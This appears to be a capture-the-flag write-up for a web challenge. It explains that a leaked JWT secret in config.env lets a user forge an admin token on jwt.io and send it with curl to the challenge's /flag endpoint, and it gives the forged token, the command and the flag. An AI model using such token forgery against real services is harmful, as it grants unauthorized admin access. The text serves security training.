# Jasons Backing Service

Vulnerability:
* config.env contains the SECRET which is used to generate JWT

Exploitation:
* Go to https://jwt.io/ and enter the SECRET into `your-256-bit-secret` field in verify signature
* Set the following payload:
```json
{
  "name": "admin",
  "admin": 1
}
```
* Set the generated JWT and curl the /flag endpoint, e.g.
`curl --cookie "token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiYWRtaW4iLCJhZG1pbiI6MX0.LJZOowkPC1PcWFwgSNaex-7RqPQmI0W3uZ763ostWyc" https://spooky-jason-bakeshop-web.chals.io/flag`

Flag:
 
`NICC{jWoT_tOkeNs_nEed_saf3_secr3ts}`
